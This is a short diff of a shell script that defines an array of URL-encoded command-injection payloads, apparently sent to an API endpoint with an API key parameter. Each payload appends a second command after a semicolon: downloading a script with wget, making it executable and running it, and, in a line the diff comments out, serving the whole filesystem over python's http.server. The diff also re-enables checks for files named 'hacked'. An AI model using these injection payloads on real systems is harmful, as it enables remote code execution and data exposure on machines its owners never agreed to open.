@@ -7,7 +7,7 @@ payloads=(
     ";wget%20$script"
     ";chmod%20+x%20./test.sh"
     ";sh%20test.sh"
-    ";python3%20-m%20http.server%20--directory%20/%20"
+    #";python3%20-m%20http.server%20--directory%20/%20"
 )
 ending="&APIKEY=1234"
 
@@ -29,7 +29,7 @@ function check_file {
 
 echo "-------------"
 
-#check_file "./test"
-#check_file "./hacked"
-#check_file "./test.sh"
-#check_file "./hacked3.txt"
+check_file "./test"
+check_file "./hacked"
+check_file "./test.sh"
+check_file "./hacked3.txt"
